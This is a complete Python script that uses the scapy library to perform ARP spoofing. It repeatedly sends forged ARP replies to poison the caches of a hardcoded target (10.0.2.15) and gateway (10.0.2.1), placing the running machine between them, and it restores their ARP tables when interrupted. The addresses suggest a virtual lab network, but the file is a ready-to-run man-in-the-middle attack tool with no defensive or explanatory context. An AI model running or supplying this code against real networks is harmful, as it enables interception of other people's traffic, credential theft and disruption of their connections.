#!/usr/bin/env python3

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=get_mac(target_ip), psrc=spoof_ip)

    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(
        destination_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet, count=4, verbose=False)


target = "10.0.2.15"
gateway = "10.0.2.1"
packet_counter = 0

try:
    while True:
        spoof(target, gateway)
        spoof(gateway, target)
        packet_counter += 1
        print(f"Sending spoof packet number {packet_counter}", end="\r")
        time.sleep(2)
except KeyboardInterrupt:
    restore(target, gateway)
    restore(gateway, target)
    print(
        f"\rScript canceled by user. Restored ARP tables.")
